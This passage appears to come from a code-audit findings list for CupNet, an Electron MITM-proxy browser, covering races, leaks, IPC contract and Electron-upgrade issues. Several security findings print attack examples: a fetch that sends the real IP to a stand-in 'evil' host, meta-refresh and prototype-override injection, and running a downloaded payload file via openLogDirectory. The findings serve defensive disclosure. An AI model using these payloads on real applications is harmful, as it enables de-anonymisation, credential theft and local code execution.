- **Fix:** Extend ipcScope.onProfileLoggedIn (cupnet-runtime.js:1360) to re-apply the profile's settings before showing the window: const s = loadSettings(); mitmProxy?.setBrowser(s.tlsProfile || 'chrome'); mitmProxy?.setGlobalCorsEnabled?.(!!s.corsBypassEnabled); await applyEffectiveTrafficMode(getCurrentTrafficMode(), persistentAnonymizedProxyUrl, { source: 'profile-login', force: true }). For isolation on switch, extend onProfileSwitchGate to end the current DB session, disconnect the global proxy, and destroy all tabs (tabManager.destroyAll()) before showing the gate. After login, create a fresh session and a first tab. Scoping partition names by profile id is a larger follow-up.
- _Reported 2× (also: proxy)_

#### A-156 🟡 External proxy ports and existing client sockets stay bound to the stopped MitmProxy after restart
- **Where:** `mitm-proxy.js:999` · **Category:** leak · **Status:** open
- **Impact:** After 'Restart MITM', the active-tab reload that restartMitmProxy triggers reuses Chromium's pooled tunnel to the old instance and gets 502 'Worker not ready'. All external proxy ports (e.g. 7777) return 502 for every request until the user stops and restarts them. The old instance and its sockets are never released.
- **Fix:** (1) In MitmProxy, keep `this._sockets = new Set()`. Add the socket in _handleConnection and remove it on 'close'. In stop(), destroy every socket in the set and clear it. (2) Change ExternalProxyPort to take a getter: `new ExternalProxyPort(() => ctx.mitmProxy, opts)`, store it as this._getParent, and add `get parent() { return this._getParent(); }`. When the parent is null, return a 502 instead of throwing. (3) At the end of restartMitmProxy, call `closeAllConnections()` on the tab partitions (tabManager sessions, persist:cupnet-shared, defaultSession) before reloadActiveTab.
- _Reported 3× (also: mitm-intercept)_

#### A-157 🟡 Worker stdout line buffer (_bufParts) is not reset on worker restart, so a partial line from the crashed worker corrupts the new worker's __init__ line and it never becomes ready
- **Where:** `mitm-proxy.js:440` · **Category:** ipc-contract · **Status:** open
- **Impact:** A large response is being written when the Go worker panics. It restarts after 1s, but every subsequent request rejects with 'Worker not ready' and every page returns 502 until the app is restarted. Nothing is logged because malformed lines are swallowed.
- **Fix:** In _start(), before spawning, set `this._bufParts = [];`. Better, use a closure-local buffer per proc (`const bufParts = []; proc.stdout.on('data', ...)` referencing bufParts), so late data from the old proc cannot mix with the new one. As defense in depth, when a line fails to parse but contains '{"id":"__init__"', parse the substring from its last '{"id":' onward. In Go, add `defer func(){ if r := recover(); r != nil { sendLine(map[string]any{"id": id, "statusCode": 0, "error": fmt.Sprint(r)}) } }()` at the top of the request goroutine in main.go:157.
- _Reported 3× (also: azuretls-fingerprint, mitm-intercept)_

#### A-237 ⚪ Traffic-log encryption key is read when the queued write executes, not when the request is captured
- **Where:** `db.js:1031` · **Category:** race · **Status:** open
- **Impact:** Heavy traffic, then the user locks or switches profile. Entries captured under profile A are either redacted (vault locked between enqueue and execution), losing the bodies A asked to keep encrypted, or encrypted with profile B's key once B unlocks. Those rows become undecryptable for A (hydrateRequestLogRow returns _locked or null).
- **Fix:** In insertRequestAsync, compute the fields synchronously before enqueueing: `const prepared = _prepareLogEntry(entry || {}); return enqueueWrite(() => insertRequest(sessionId, tabId, prepared, /*prepared*/ true), 'high');`. Make insertRequest skip _prepareLogEntry when given already-prepared fields. Do NOT capture the key Buffer reference for later use: lockVault/lockAll zero keys in place with key.fill(0) (vault-session-service.js:33-35), so a captured reference would encrypt with an all-zero key. Encrypt immediately, or copy the key with Buffer.from(key).

#### A-238 ⚪ User CRUD writes share the high-priority DB queue with traffic log inserts and are rejected when it overflows
- **Where:** `db.js:39` · **Category:** data-loss · **Status:** open
- **Impact:** A page burst (hundreds of requests per second with bodies, MITM plus CDP logging) fills the high queue. The user saves a note or a proxy profile at that moment and gets an overflow rejection, so the data is lost, or waits behind thousands of inserts. On quit, close() synchronously drains up to 100k tasks including encryption, which can freeze shutdown for seconds.
- **Fix:** Route insertRequestAsync/updateRequestAsync to their own lane, or to 'low' with a higher limit. In _processWriteQueue, drain up to N request inserts per tick inside one db.transaction(). Exempt user-data writes (notes, proxy profiles, rules, sessions) from the overflow rejection, or give them a small dedicated lane that is always served first.

#### A-265 ⚪ Concurrent MITM start/restart: the stale attempt's catch handler stops the newly started healthy proxy
- **Where:** `main-process/cupnet-runtime.js:934` · **Category:** race · **Status:** open
- **Impact:** The user clicks 'Restart MITM' while the initial start is still waiting for the worker (or double-clicks restart). The restart stops instance #1 and starts #2 successfully. About 120s later, attempt #1's waitReady rejects and its catch calls _clearMitmProxyInstance(), which stops the healthy #2. The retry loop then starts #3, so all traffic fails in the meantime and mitmState flips to failed or starting.
- **Fix:** Keep a module-level `let mitmGen = 0` and a single `mitmOpChain = Promise.resolve()`. Run both startMitmWithRetry and restartMitmProxy through `mitmOpChain = mitmOpChain.then(fn, fn)`. Change _clearMitmProxyInstance(expected) to stop only when `mitmProxy === expected`, or when no `expected` is passed. Each attempt should capture the instance it created, returned from startMitmProxy, and on failure clear only that one. In AzureTLSWorker.shutdown(), emit a 'stopped' event (or keep a list of pending waitReady rejecters and reject them with new Error('Worker shutdown')). Make waitReady listen for it so stale waiters settle immediately, and detach the proc.stdout listener in shutdown.

#### A-302 ⚪ CDP extraInfoQueue entries are never evicted, so the per-tab Map grows without bound while logging
- **Where:** `main-process/services/cdp-network-logging.js:803` · **Category:** leak · **Status:** open
- **Impact:** With Rec on and filterPatterns set (or for requests whose ExtraInfo arrives after loadingFinished), every such response adds a Map entry holding the full response headers for the lifetime of the tab. Long sessions on busy pages grow main-process memory steadily.
- **Fix:** At line 803, replace the set with: const q = [extraHeaders]; q._addedAt = Date.now(); extraInfoQueue.set(params.requestId, q); Also consider skipping the enqueue when !ongoingRequests.has(params.requestId), since filtered and unknown requests never consume the queue.

#### A-333 ⚪ Worker stdin backpressure guard is ineffective and drain listeners pile up
- **Where:** `mitm-proxy.js:496` · **Category:** perf · **Status:** open
- **Impact:** Large uploads or a request burst while the worker is slow. Payloads accumulate unbounded in stdin's internal buffer (workerStdinQueueMax never triggers), more than 10 drain listeners trigger MaxListenersExceededWarning, and a worker crash during a write logs a critical uncaughtException.
- **Fix:** In _drainStdinQueue use `let waitingDrain = false;`. In the `!ok` branch set `waitingDrain = true;` and register `this.proc.stdin.once('drain', () => { this._stdinDraining = false; this._drainStdinQueue(); });`, then return. Change the finally block to `finally { if (!waitingDrain) finish(); }`. In _start(), right after spawn, add `this.proc.stdin.on('error', (err) => { const q = this._stdinQueue.splice(0); for (const e of q) { try { e.reject(err); } catch (_) {} } safeCatch({ module: 'mitm-proxy', eventCode: 'worker.stdin.error' }, err, 'warn'); });`.

### X-cut: IPC contract

#### A-010 🔴 Any website in a tab can call privileged IPC through window.electronAPI (preload-view): real IP leak, ext-proxy passwords, proxy switching _(WIP)_
- **Where:** `preload-view.js:61` · **Category:** security · **Status:** open
- **Impact:** A site opened through a proxy runs `window.electronAPI.getDirectIp().then(r=>fetch('https://evil/?ip='+r.ip))`. Main opens a hidden BrowserWindow in DIRECT mode and returns the user's real IP, which defeats the proxy. `window.electronAPI.extProxyList()` returns every external proxy port's login/password plus the LAN IP. `clearCookies(otherTabId)` wipes cookies in another tab, and `connectProxyTemplate(id)` switches the global proxy.
- **Fix:** In preload-view.js, wrap the electronAPI exposure in `if (location.protocol === 'file:' && /\/(new-tab|error-page|cupnet-guide|settings)\.html$/.test(location.pathname))`, and expose only cupnetCredentials and cupnetStorageActivity to other pages. Main side: add a helper `isInternalPageSender(event)` that checks event.senderFrame?.url starts with pathToFileURL(cupnetRoot).href. Apply it, or guardIpcHandler, to get-direct-ip, get-proxy-profiles, connect-proxy-template, set-tab-proxy, set-tab-cookie-group, create-cookie-group, isolate-tab, clear-cookies, ext-proxy:* and set-ui-pref.

#### A-047 🟠 Settings page (loaded in a tab with preload-view) lost all its APIs in WIP: settings never load or save _(WIP)_
- **Where:** `preload-view.js:121` · **Category:** ipc-contract · **Status:** open
- **Impact:** The user opens Settings. init() throws 'api.getSettingsAll is not a function' at settings-renderer.js:1053 and shows 'Failed to load settings', and switchTab('general') never runs. Every save handler either returns early (`if (!api.setHomepage) return;`, `if (!api.saveSecuritySettings) return;`) or throws. So homepage, filters, device permissions, vault auto-lock and traffic-log encryption can no longer be changed from the UI.
- **Fix:** Do not re-add these to the page-wide electronAPI. Either open settings.html in a trusted tool BrowserWindow that uses preload.js and is registered with registerTrustedShell, or expose a separate `cupnetSettings` bridge in preload-view.js only when location.href equals the bundled settings.html file URL, and guard the settings handlers main-side with a sender-frame URL check.
- _Reported 3× (also: core-runtime, tabs-shell-main)_

#### A-268 ⚪ Generated _ipc-scope-accessors.inc.js diverges from the live ipcScopeSet: regenerating drops syncAppContextSnapshot()
- **Where:** `main-process/ipc/_ipc-scope-accessors.inc.js:156` · **Category:** ipc-contract · **Status:** open
- **Impact:** A developer adds a scope key and follows the README. After pasting, IPC writes such as ctx.isLoggingEnabled = true no longer update appCtx, so services that read appCtx see stale logging and proxy state.
- **Fix:** In gen-ipc-scope-accessors.cjs, emit `case '${k}': ${k} = v; break;` and add `syncAppContextSnapshot();` after the switch in ipcScopeSet, then regenerate _ipc-scope-accessors.inc.js. Or delete the .inc.js file and generator and update README.md:12/:40 to say cupnet-runtime.js is the source of truth.

#### A-269 ⚪ open-devtools handler uses ctx.getMainWindow, which is not in the IPC scope, so tool windows open DevTools of the browser tab
- **Where:** `main-process/ipc/handlers/cookies-dns-ipc.js:420` · **Category:** ipc-contract · **Status:** open
- **Impact:** The user presses the DevTools shortcut/button in Proxy Manager, Rules, Log Viewer, etc. The handler skips the secondary-window branch and opens (or refuses on hostile sites) DevTools for the active browser tab instead of the tool window, which is the opposite of what the code comment describes.
- **Fix:** In cookies-dns-ipc.js:420 replace the line with `const mainWin = ctx.mainWindow;`, since 'mainWindow' is already in the scope key list.

#### A-273 ⚪ Any web page can keep the vault from auto-locking by spamming cupnetCredentials.reportCapture _(WIP)_
- **Where:** `main-process/ipc/handlers/credentials-ipc.js:1046` · **Category:** security · **Status:** open
- **Impact:** A malicious or buggy page calls reportCapture({login:'x',password:'y'}) every 60s. The vault never reaches the configured auto-lock timeout while the user is away, and a save-credential bar keeps appearing.
- **Fix:** Remove the `if (_isUnlocked()) vaultSession.bumpActivity();` line at credentials-ipc.js:1046, because page-originated events must not count as user activity. Optionally, drop events where event.senderFrame !== event.sender.mainFrame, and rate-limit or dedupe per webContents id (e.g. ignore a repeat of the same domain+login within 30s, or when a _pendingCapture for that domain is still shown).

#### A-349 ⚪ Dead or broken IPC contract leftovers: 'proxy-selected' has no handler; rule-notification / take-screenshot-now / load-proxies listeners are never sent
- **Where:** `preload.js:38` · **Category:** ipc-contract · **Status:** open

- **Fix:** In preload.js, delete selectProxy, onLoadProxies, onSetInitialLogPath, onSetFilterPatterns, onSetAutoScreenshotState, onSetAppInfo, onLogDirectorySelected (lines 38-39, 41-44, 46), onTakeScreenshotNow (line 85) and onRuleNotification (line 298). Keep onLoadProxyProfiles, selectLogDirectory and openLogDirectory. In browser-renderer.js, remove the dead subscriptions at lines 2159 and 2239-2243, and remove showRuleToast too if nothing else uses it. Delete the orphaned proxy-selector.js and preload-shell.js, and update the references in README.md:30/41-42 and SECURITY.md:36. If screenshot-on-demand or rule toasts are still wanted, restore a main-side webContents.send('take-screenshot-now') / send('rule-notification', ...) instead of deleting those two listeners.

#### A-350 ⚪ Request Editor CodeMirror loading from preload cannot work (sandboxed preload require plus contextBridge class proxying)
- **Where:** `preload.js:8` · **Category:** compat · **Status:** open
- **Impact:** Opening the Request Editor: loadCM() swallows the throw, initCodeMirror() goes to showBodyEditorFallback(), and users always get a plain textarea with no syntax highlighting or search in the response panel.

Load it with a <script> in request-editor.html before request-editor-renderer.js, change loadCM() to use window.CupnetCM, and remove getRequestEditorCodeMirrorModules/getRequestEditorCodeMirror from preload.js.

### X-cut: Electron upgrade

#### A-192 🟡 Chromium 132 -> 146 bump widens the gap between the UA / Sec-CH-UA and the TLS fingerprint (Electron-specific UA leak)
- **Where:** `user-agent-utils.js:15` · **Category:** compat · **Status:** ✅ PARTIALLY FIXED 2026-09-23 — UA reduced to major-only in sanitizer. sec-ch-ua rewrite still open.
- **Impact:** After upgrading to Electron 41, a user picks the 'chrome' TLS template in Proxy Manager. That sets the tab UA to Chrome/133 via session.setUserAgent, but Chromium still sends `sec-ch-ua: "Chromium";v="146"` and navigator.userAgentData reports 146. Cloudflare/Turnstile, Akamai and similar bot checks see UA major 133, client-hint major 146 and a Go azuretls 'Chrome' JA3/JA4 in one request, and they challenge or block. With no profile set, the renderer UA is `Chrome/146.0.7680.216`, and that non-reduced patch version exposes an embedded Chromium.
- **Fix:** In sanitizeUserAgentChromeOnly add `s = s.replace(/\b(Chrome|Chromium)\/(\d+)\.\d+\.\d+\.\d+/g, '$1/$2.0.0.0');`. Derive the Chrome preset major from process.versions.chrome instead of hard-coding it: in proxy-tls-ua-sync.js, proxy-manager-renderer.js UA_PRESETS, azure-tls-worker.js BROWSER_PROFILES and DEFAULT_CHROME_UA. In applyOutboundUserAgentToMitmHeaders, when the outbound UA is Chrome-like, rewrite sec-ch-ua / sec-ch-ua-full-version-list in both headers and orderedHeaders so the major matches the UA and a `"Google Chrome"` brand is included. For Firefox/Safari UAs, drop the sec-ch-ua* headers.

#### A-264 ⚪ Deprecated positional 'console-message' arguments (deprecated in Electron 35)
- **Where:** `main-process/cupnet-runtime.js:1386` · **Category:** compat · **Status:** open
- **Impact:** On Electron 35-41, the main process prints a DeprecationWarning for every BrowserWindow created (the listener is attached in 'browser-window-created'). Once the positional arguments are removed, `level` is undefined and `undefined < 2` is false, so every renderer message, including verbose logs, is written to sysLog as 'info' and warnings/errors are no longer classified. If the code is migrated to `event.level` without mapping, the string comparisons (`'error' >= 3`) are always false and errors are never logged as errors.
- **Fix:** `win.webContents.on('console-message', (details) => { const LV = { debug: 0, verbose: 0, info: 1, warning: 2, error: 3 }; const level = typeof details.level === 'string' ? (LV[details.level] ?? 1) : details.level; const message = details.message; const line = details.lineNumber; const sourceId = details.sourceId; ... })`. On Electron 34 this falls back to the numeric positional form, so keep a compat branch: `const d = (typeof arguments[1] === 'number') ? { level: arguments[1], message: arguments[2], lineNumber: arguments[3], sourceId: arguments[4] } : event;`.
- _Reported 2× (also: core-runtime)_

#### A-292 ⚪ Forward-compat (Electron 42-44, current npm latest 44.4.5): the clipboard API becomes Promise-based and notifications need code signing
- **Where:** `main-process/ipc/handlers/screenshots-ipc.js:31` · **Category:** compat · **Status:** open
- **Impact:** On Electron 44, 'Copy screenshot to clipboard' reports success before the write finishes, or throws on the new signature, and the clipboard stays empty. On 42+ unsigned macOS builds, any Notification emits 'failed' and is never shown.
- **Fix:** No change needed for an Electron 41 target. If going to 44+, check the actual clipboard API change and `await` the clipboard calls in screenshots-ipc.js:31 and misc-ipc.js:136 if they become async. Optionally remove the unused Notification import from cupnet-runtime.js:8. Optionally have rebuild-electron-native.js read CUPNET_ELECTRON_REBUILD_ARCH / npm_config_arch before probing.

#### A-294 ⚪ Deprecated webContents.canGoBack/goBack/canGoForward/goForward (use navigationHistory)
- **Where:** `main-process/ipc/handlers/tabs-ipc.js:99` · **Category:** compat · **Status:** open
- **Impact:** On Electron 41, pressing Back/Forward in the toolbar prints deprecation warnings to the main-process console. When the methods are removed, `canGoBack` is undefined, so the IPC handler throws 'is not a function' and Back/Forward stop working.
- **Fix:** `const h = tab?.view?.webContents?.navigationHistory; if (h?.canGoBack()) h.goBack();` and `if (h?.canGoForward()) h.goForward();`. navigationHistory has been available since Electron 32, so the change is safe on the current 34.
- _Reported 2× (also: browser-ui)_

#### A-317 ⚪ Linux: Electron 38 defaults to native Wayland (--ozone-platform=auto), so absolute positioning of popover windows is ignored
- **Where:** `main-process/services/sub-windows.js:835` · **Category:** compat · **Status:** open
- **Impact:** On Ubuntu 24.04 with a Wayland session, clicking the site-info (lock) button opens the popover centred on screen or at the compositor's chosen spot instead of under the button. Cascaded log-viewer windows stack on top of each other, and saved window positions are not restored.
- **Fix:** In main-process/runtime-early-flags.js, before app ready: `if (process.platform === 'linux' && !process.env.CUPNET_ALLOW_WAYLAND) app.commandLine.appendSwitch('ozone-platform', 'x11');`. Otherwise, move the site-info popover to an in-window WebContentsView overlay.

#### A-344 ⚪ better-sqlite3 ^12.8.0: works on Electron 41, but the caret range and the rebuild pipeline break on 42+
- **Where:** `package.json:83` · **Category:** compat · **Status:** open
- **Impact:** Running `npm install` without the lockfile, or a Renovate bump, can resolve better-sqlite3 to 12.9.1: prebuild download fails on Electron 39+ and CI falls back to a compile or breaks. Moving past Electron 41 to 42-44 with 12.8.0 fails to compile against the V8 14.8+ headers, or @electron/rebuild aborts at the node-abi lookup. The app then crashes at startup in db.js with a NODE_MODULE_VERSION mismatch.
- **Fix:** When bumping Electron, change the range to "better-sqlite3": "~12.8.0" for Electron 41, or to >=12.11.1 (or 13.x N-API) for 42+. Bump @electron/rebuild to ^4 in the same PR and regenerate package-lock.json.

#### A-345 ⚪ Release toolchain lags the Electron 41 upgrade (electron-builder 24, engines <24, no mac minimumSystemVersion)
- **Where:** `package.json:62` · **Category:** build · **Status:** open
- **Impact:** In the CI build-all.yml macOS job, `npm run dist:mac:local` cross-rebuilds better-sqlite3 for x64 on an arm64 runner through electron-builder 24's rebuild. A compile or ABI mismatch leaves one DMG arch with a module built for the wrong ABI, and it crashes at startup. Separately, users on macOS 11 update to the new DMG and can no longer launch CupNet.
- **Fix:** Bump these in the same PR as the Electron upgrade: electron ~41, electron-builder ^26, @electron/rebuild ^4, and engines ">=22.12". Add "minimumSystemVersion": "12.0" under build.mac. Add a per-arch smoke step (npm run test:db under ELECTRON_RUN_AS_NODE) to build-all.yml.

### X-cut: security

#### A-013 🟠 Upstream TLS certificate verification disabled for all proxied traffic (Go worker + Node fallback)
- **Where:** `azuretls-go/request.go:30` · **Category:** security · **Status:** open
- **Impact:** The user connects a third-party residential or datacenter proxy (the core use case), or sits on hostile Wi-Fi. The proxy operator answers CONNECT to bank.com with a self-signed certificate. The Go worker accepts it, and the tab shows a normal HTTPS page with a lock. Logins, vault autofill (credentials-fill-active-tab) and session cookies all go to the attacker. A shared launch profile with persistDnsOverrides (session-profile-loader.js:66) can also permanently point a host at an attacker IP, and that connection is accepted silently too.
- **Fix:** request.go: `s.InsecureSkipVerify = envBool("CUPNET_UPSTREAM_INSECURE", false)`. Also pass a per-request `insecure` flag from mitm-proxy (true only for DNS-override hosts the user explicitly marked insecure) and create or cache sessions keyed on it. When a certificate error comes back, return buildMitmGatewayErrorResponse (a TLS error page) instead of retrying. In mitm-proxy.js _nativeHttpsFallback, set `rejectUnauthorized: true, servername: parsed.hostname`. Also route the fallback through the tab's upstream proxy, or skip the fallback when an upstream proxy is configured, so it cannot leak the real IP.
- _Reported 2× (also: mitm-intercept)_

#### A-040 🟠 Privileged windows have no navigation or window-open guard; trust is tied to webContents id, not URL
- **Where:** `main-process/services/sub-windows.js:25` · **Category:** security · **Status:** open
- **Impact:** Any HTML injection in a tool window (see the page-analyzer and log-viewer findings) inserts <meta http-equiv=refresh content="0;url=https://evil">. A user dragging a link onto a tool window does the same. The window navigates to evil.example, which runs `electronAPI.getProxyProfileUrl(1)` (decrypted proxy credentials, guarded but passes), `credentialsList()` / `credentialsGet(id)` if the vault is unlocked, and `openLogDirectory('/path/to/payload')`, which calls shell.openPath and executes local files.
- **Fix:** In main-process/index.js (before any window is created), add `app.on('web-contents-created', (_, wc) => { wc.on('will-attach-webview', e => e.preventDefault()); if (wc.getType() === 'window') { wc.on('will-navigate', (e, url) => { if (!url.startsWith(appRootFileUrl)) e.preventDefault(); }); wc.on('will-redirect', same); wc.setWindowOpenHandler(({url}) => { if (/^https?:/.test(url)) shell.openExternal(url); return { action: 'deny' }; }); } });`. Tab WebContentsViews keep their own handlers, and tab-manager sets setWindowOpenHandler later, which overrides this one. In ipc-trusted-sender.js isTrustedShell, also require `String(event.senderFrame?.url || '').startsWith(appRootFileUrl)`. In open-log-directory, only open the logs directory or a path returned earlier by select-log-directory.
- _Reported 2× (also: tool-windows-b)_

#### A-046 🟠 Page Analyzer renders page-controlled form.method unescaped (analysis script runs in page main world)
- **Where:** `page-analyzer-renderer.js:245` · **Category:** security · **Status:** ✅ FIXED 2026-09-23 — wrapped page-controlled form.method in esc() (page-analyzer-renderer.js).
- **Impact:** A malicious site sets `String.prototype.toUpperCase=function(){return '<meta http-equiv="refresh" content="0;url=https://evil.example/">'}`. The user opens Page Analyzer → Forms on that site. The analyzer window, which is trusted and has preload.js, navigates to evil.example, and that page can call the full electronAPI.
- **Fix:** In page-analyzer-renderer.js:245 use `${esc(String(form.method))}`, and use `${Number(form.index) + 1}` and `data-form-index="${Number(form.index)}"`. Apply the same Number()/esc() treatment to field.index and typeClass in the fields table. In page-analyzer-ipc.js use `webContents.executeJavaScriptInIsolatedWorld(999, [{ code: `(${ctx._analyzeFormsScript})()` }])` (and the same for the captcha script) so page prototypes cannot affect the result. Defence in depth: in _spawnTrustedToolWindow add `win.webContents.on('will-navigate', e => e.preventDefault())` and `setWindowOpenHandler(() => ({ action: 'deny' }))`.

#### A-228 ⚪ credentials-renderer escapeAttr double-escapes, corrupting vault values containing quotes
- **Where:** `credentials-renderer.js:7` · **Category:** data-loss · **Status:** open
- **Impact:** A custom hidden field or password containing `"` (for example an API secret) is opened in the editor and saved. The stored value now contains `&quot;` instead of `"`, and the secret is silently changed.
- **Fix:** credentials-renderer.js:7 → `function escapeAttr(s) { return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;'); }`. A more robust option: build the rows with innerHTML without value attributes, then set `row.querySelector('.uri-val').value = uri` and `.cf-name` / `.cf-value` `.value` through the DOM.
- _Reported 2× (also: vault-security)_

#### A-279 ⚪ open-log-directory passes a renderer-supplied path to shell.openPath
- **Where:** `main-process/ipc/handlers/log-compare-execute-ipc.js:66` · **Category:** security · **Status:** open
- **Impact:** Attacker JavaScript in a trusted window calls `electronAPI.openLogDirectory('/Users/u/Downloads/payload.command')` and the OS executes the file.
- **Fix:** Ignore the argument and open only the log path saved in settings (`ctx.loadSettings().logPath`) or `app.getPath('logs')`. If an argument must be accepted, `path.resolve` it, require `fs.statSync(p).isDirectory()` and that it sits under an allowed root. Register the handler with `guardIpcHandler('open-log-directory', ...)`.
- _Reported 2× (also: data-logging)_

#### A-392 ⚪ Web pages can open arbitrary file:// URLs in tabs (window.open / navigate-to bypass Chromium's web-to-file block) _(WIP)_
- **Where:** `utils.js:198` · **Category:** security · **Status:** open
- **Impact:** evil.example calls window.open('file:///Users/<u>/Downloads/evil.html'), or electronAPI.navigateTo('file:///...'). A local HTML file the attacker previously got downloaded then opens with a file:// origin in a tab, and the preload-view API attaches to it.
- **Fix:** Add a `fromWeb` path. In tabs-ipc.js 'navigate-to', find the sender with ctx.tabManager.getTabIdByWebContentsId(event.sender.id). If the sender is a tab webContents rather than mainWindow.webContents, and the resolved url starts with `file:` (or any scheme other than http/https/about:blank), return, unless it exactly equals an internal page such as getNewTabUrl() or getInternalPageUrl('settings'|'guide'). In main-window.js 'open-in-new-tab', after resolving, drop anything that does not match /^https?:\/\//i or equal 'about:blank'. Simplest shared form: pass an option `{ allowFile: false }` to resolveLoadUrlForWebContents and have utils.js:199 return null when allowFile is false.
